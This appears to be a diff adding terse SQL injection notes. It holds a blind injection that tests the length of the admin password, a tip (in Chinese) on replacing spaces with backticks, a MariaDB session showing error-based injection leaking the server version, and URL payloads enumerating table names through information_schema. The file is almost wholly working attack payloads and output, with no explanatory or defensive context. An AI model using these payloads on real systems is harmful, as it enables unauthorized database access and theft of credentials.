@@ -1,0 +1,20 @@
+SELECT * FROM users WHERE user_id=-1 or (length((SELECT password from users where first_name='admin')) = 33);
+`代替空格`
+MariaDB [updatexml]> select`username`from users;
++----------+
+| username |
++----------+
+| root     |
++----------+
+1 row in set (0.00 sec)
+
+MariaDB [updatexml]> select 1 and row(2,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1);
+ERROR 1062 (23000): Duplicate entry '10.1.28-MariaDB:0' for key 'group_key'
+
+http://server/?id=(1)and(select+1+from(select+count(*),concat((select+table_name+from+infor
+mation_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+
+by+x)a)--
+
+http://server/?id=(1)and(select+1+from(select+count(*),concat((select+table_name+from+infor
+mation_schema.tables+limit+1,1),floor(rand(0)*2))x+from+information_schema.tables+group+
+by+x)a)-- 
